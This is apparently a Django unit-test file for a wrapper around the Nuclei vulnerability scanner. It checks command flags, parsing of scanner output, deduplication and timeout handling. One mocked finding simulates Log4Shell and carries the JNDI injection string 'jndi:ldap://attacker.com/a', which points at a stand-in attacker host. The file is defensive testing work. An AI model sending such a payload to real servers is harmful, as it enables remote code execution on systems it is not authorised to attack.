"""nuclei_scanner 模組的單元測試。"""
import json
import os
import subprocess
from unittest.mock import MagicMock, patch

from django.test import TestCase


class TestRunNuclei(TestCase):
    """run_nuclei 的單元測試。

    所有呼叫 run_nuclei 的案例都必須 patch append_log，
    否則它會嘗試寫入 DB（ScanJob scan_log 欄位）。
    """

    def test_binary_missing_returns_empty_list(self):
        with (
            patch("apps.scans.nuclei_scanner.shutil.which", return_value=None),
            patch("apps.scans.nuclei_scanner.append_log"),
        ):
            from apps.scans.nuclei_scanner import run_nuclei
            result = run_nuclei("https://example.com", scan_job_id=1)
        self.assertEqual(result, [])

    def test_fast_mode_includes_tags_flag(self):
        with (
            patch("apps.scans.nuclei_scanner.shutil.which", return_value="/usr/bin/nuclei"),
            patch("apps.scans.nuclei_scanner.subprocess.run") as mock_run,
            patch("apps.scans.nuclei_scanner.append_log"),
        ):
            mock_run.return_value = MagicMock(stdout="", returncode=0)
            from apps.scans.nuclei_scanner import run_nuclei
            run_nuclei("https://example.com", scan_job_id=1, deep=False)
        cmd = mock_run.call_args[0][0]
        self.assertIn("-tags", cmd)
        idx = cmd.index("-tags")
        self.assertIn("cves", cmd[idx + 1])
        self.assertEqual(cmd[cmd.index("-c") + 1], "25")

    def test_deep_mode_excludes_tags_flag(self):
        with (
            patch("apps.scans.nuclei_scanner.shutil.which", return_value="/usr/bin/nuclei"),
            patch("apps.scans.nuclei_scanner.subprocess.run") as mock_run,
            patch("apps.scans.nuclei_scanner.append_log"),
        ):
            mock_run.return_value = MagicMock(stdout="", returncode=0)
            from apps.scans.nuclei_scanner import run_nuclei
            run_nuclei("https://example.com", scan_job_id=1, deep=True)
        cmd = mock_run.call_args[0][0]
        self.assertNotIn("-tags", cmd)
        self.assertEqual(cmd[cmd.index("-c") + 1], "50")

    def test_parses_nuclei_jsonl_output(self):
        record = {
            "template-id": "CVE-2021-44228",
            "info": {
                "name": "Log4Shell RCE",
                "severity": "critical",
                "description": "JNDI injection leads to RCE.",
                "remediation": "Upgrade to Log4j 2.17.1+.",
                "tags": ["cve", "rce"],
            },
            "matched-at": "https://example.com/api/login",
            "extracted-results": ["jndi:ldap://attacker.com/a"],
        }
        with (
            patch("apps.scans.nuclei_scanner.shutil.which", return_value="/usr/bin/nuclei"),
            patch("apps.scans.nuclei_scanner.subprocess.run") as mock_run,
            patch("apps.scans.nuclei_scanner.append_log"),
        ):
            mock_run.return_value = MagicMock(stdout=json.dumps(record) + "\n", returncode=0)
            from apps.scans.nuclei_scanner import run_nuclei
            results = run_nuclei("https://example.com", scan_job_id=1)

        self.assertEqual(len(results), 1)
        r = results[0]
        self.assertEqual(r["title"], "Log4Shell RCE")
        self.assertEqual(r["severity"], "critical")
        self.assertEqual(r["category"], "security")
        self.assertEqual(r["priority_score"], 90.0)
        self.assertEqual(r["confidence"], 0.85)
        self.assertIn("CVE-2021-44228", r["evidence"])
        self.assertEqual(r["selector"], "")
        self.assertIsNone(r["bounding_box"])
        self.assertIn("ai_handoff_prompt", r)

    def test_severity_to_priority_score_mapping(self):
        from apps.scans.nuclei_scanner import _build_finding

        cases = [
            ("critical", 90.0),
            ("high", 75.0),
            ("medium", 55.0),
            ("low", 30.0),
            ("info", 10.0),
        ]
        for severity, expected_score in cases:
            record = {
                "template-id": "test-tpl",
                "info": {"name": "Test", "severity": severity, "tags": []},
                "matched-at": "https://example.com",
            }
            finding = _build_finding(record)
            self.assertEqual(
                finding["priority_score"],
                expected_score,
                msg=f"severity={severity}",
            )

    def test_deduplication_removes_duplicate_findings(self):
        record_json = json.dumps({
            "template-id": "CVE-2021-44228",
            "info": {"name": "Log4Shell", "severity": "critical", "tags": []},
            "matched-at": "https://example.com/api",
        })
        two_lines = record_json + "\n" + record_json + "\n"
        with (
            patch("apps.scans.nuclei_scanner.shutil.which", return_value="/usr/bin/nuclei"),
            patch("apps.scans.nuclei_scanner.subprocess.run") as mock_run,
            patch("apps.scans.nuclei_scanner.append_log"),
        ):
            mock_run.return_value = MagicMock(stdout=two_lines, returncode=0)
            from apps.scans.nuclei_scanner import run_nuclei
            results = run_nuclei("https://example.com", scan_job_id=1)
        self.assertEqual(len(results), 1)

    def test_timeout_returns_empty_list(self):
        with (
            patch("apps.scans.nuclei_scanner.shutil.which", return_value="/usr/bin/nuclei"),
            patch("apps.scans.nuclei_scanner.subprocess.run") as mock_run,
            patch("apps.scans.nuclei_scanner.append_log"),
        ):
            mock_run.side_effect = subprocess.TimeoutExpired(cmd="nuclei", timeout=360)
            from apps.scans.nuclei_scanner import run_nuclei
            results = run_nuclei("https://example.com", scan_job_id=1)
        self.assertEqual(results, [])

    def test_single_url_uses_u_flag(self):
        """無 extra_urls 時應使用 -u 單一 URL 旗標。"""
        with (
            patch("apps.scans.nuclei_scanner.shutil.which", return_value="/usr/bin/nuclei"),
            patch("apps.scans.nuclei_scanner.subprocess.run") as mock_run,
            patch("apps.scans.nuclei_scanner.append_log"),
        ):
            mock_run.return_value = MagicMock(stdout="", returncode=0)
            from apps.scans.nuclei_scanner import run_nuclei
            run_nuclei("https://example.com", scan_job_id=1)
        cmd = mock_run.call_args[0][0]
        self.assertIn("-u", cmd)
        self.assertNotIn("-l", cmd)
        self.assertEqual(cmd[cmd.index("-u") + 1], "https://example.com")

    def test_extra_urls_uses_l_flag_with_temp_file(self):
        """傳入 extra_urls 時應使用 -l 旗標，且 temp file 掃完後被刪除。"""
        captured_path: list[str] = []

        original_run = subprocess.run

        def fake_run(cmd, **kwargs):
            # 記錄 temp file 路徑並確認其存在
            if "-l" in cmd:
                idx = cmd.index("-l")
                captured_path.append(cmd[idx + 1])
                self.assertTrue(os.path.exists(captured_path[0]), "temp file 應在執行時存在")
            return MagicMock(stdout="", returncode=0)

        with (
            patch("apps.scans.nuclei_scanner.shutil.which", return_value="/usr/bin/nuclei"),
            patch("apps.scans.nuclei_scanner.subprocess.run", side_effect=fake_run),
            patch("apps.scans.nuclei_scanner.append_log"),
        ):
            from apps.scans.nuclei_scanner import run_nuclei
            run_nuclei(
                "https://example.com",
                scan_job_id=1,
                extra_urls=["https://example.com/page1", "https://example.com/page2"],
            )

        self.assertEqual(len(captured_path), 1, "應有一個 -l 旗標")
        self.assertFalse(os.path.exists(captured_path[0]), "temp file 應在執行後被刪除")

    def test_extra_urls_deduplicates_entry_url(self):
        """entry URL 已包含在 extra_urls 中時不應重複。"""
        with (
            patch("apps.scans.nuclei_scanner.shutil.which", return_value="/usr/bin/nuclei"),
            patch("apps.scans.nuclei_scanner.subprocess.run") as mock_run,
            patch("apps.scans.nuclei_scanner.append_log"),
        ):
            mock_run.return_value = MagicMock(stdout="", returncode=0)
            from apps.scans.nuclei_scanner import run_nuclei
            run_nuclei(
                "https://example.com",
                scan_job_id=1,
                # entry URL 重複出現在 extra_urls
                extra_urls=["https://example.com", "https://example.com/page1"],
            )
        cmd = mock_run.call_args[0][0]
        self.assertIn("-l", cmd)
        url_file = cmd[cmd.index("-l") + 1]
        # 檔案已刪除，無法直接讀取；驗證指令正確即可
        self.assertNotIn("-u", cmd)

    def test_malformed_json_line_is_skipped(self):
        good_record = json.dumps({
            "template-id": "test-id",
            "info": {"name": "Valid", "severity": "high", "tags": []},
            "matched-at": "https://example.com",
        })
        mixed = "NOT_JSON\n" + good_record + "\n"
        with (
            patch("apps.scans.nuclei_scanner.shutil.which", return_value="/usr/bin/nuclei"),
            patch("apps.scans.nuclei_scanner.subprocess.run") as mock_run,
            patch("apps.scans.nuclei_scanner.append_log"),
        ):
            mock_run.return_value = MagicMock(stdout=mixed, returncode=0)
            from apps.scans.nuclei_scanner import run_nuclei
            results = run_nuclei("https://example.com", scan_job_id=1)
        self.assertEqual(len(results), 1)
        self.assertEqual(results[0]["title"], "Valid")
